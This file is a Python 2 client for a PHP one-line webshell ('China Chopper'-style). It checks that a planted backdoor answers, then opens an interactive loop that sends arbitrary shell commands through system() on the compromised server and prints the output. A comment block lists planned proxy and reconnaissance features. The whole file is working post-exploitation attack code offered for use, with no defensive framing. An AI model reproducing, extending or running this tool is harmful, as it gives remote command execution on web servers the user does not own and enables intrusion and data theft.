#!/usr/bin/env python
# encoding: utf-8

import requests
import random
import string
import sys


'''
def code_exec(url, code):
    return status


def check_shell_exec(url):

def get_system_info():

def get_phpinfo():

def http_proxy():

def socks_proxy():

def

'''





def init(url, method, auth):
    return ""

def shell_exec(url, method, auth, command):
    # system, exec, shell_exec, popen, proc_open, passthru
    if method == "POST":
        data = {auth:"system($_POST[command]);",  "command":command}
        response = requests.post(url, data=data)
    elif method == "GET":
        data = {auth:"system($_GET[command]);", "command":command}
        response = requests.get(url, data=data)
    else:
        return (False, "Unsupported method!")
    content = response.text
    if response.status_code == 200:
        return (True, content)
    else:
        return (False, content)

def shell(url, method, auth):
    print "[+] Opening shell..."
    while True:
        command = raw_input("$ ")
        if string.lower(command) == "exit":
            break
        result = shell_exec(url, method, auth, command)
        if result[0]:
            print "%s" % (result[1])
        else:
            print "[-] %s" % (result[1])

def random_string(length, random_range):
    result = ""
    for i in range(length):
        result += random.choice(random_range)
    return result

def check_working(url, method, auth):
    print "[+] Checking webshell valid..."
    key = random_string(6, string.letters)
    value = random_string(32, string.letters)
    print "[+] Using key : [%s]" % (key)
    print "[+] Using value : [%s]" % (value)
    data = {auth:"echo $_POST[%s];" % (key), key:value}
    response = requests.post(url, data=data)
    content = response.content
    return value in content

def main():
    if len(sys.argv) != 4:
        print "Usage : "
        print "        python %s [URL] [METHOD] [AUTH]" % (sys.argv[0])
        print "Example : "
        print "        python %s http://127.0.0.1/c.php POST c" % (sys.argv[0])
        print "Author : "
        print "        WangYihang <wangyihanger@gmail.com>"
        exit(1)
    url = sys.argv[1]
    method = sys.argv[2]
    auth = sys.argv[3]
    print "Using config : "
    print "    URL : %s" % (url)
    print "    METHOD : %s" % (method)
    print "    AUTH : %s" % (auth)
    print "[+] Connecting..."
    if check_working(url, method, auth):
        print "[+] Your webshell is working well!"
        shell(url, method, auth)
    else:
        print "[+] The webshell maybe invaild! Check your configuration!"

if __name__ == "__main__":
    main()
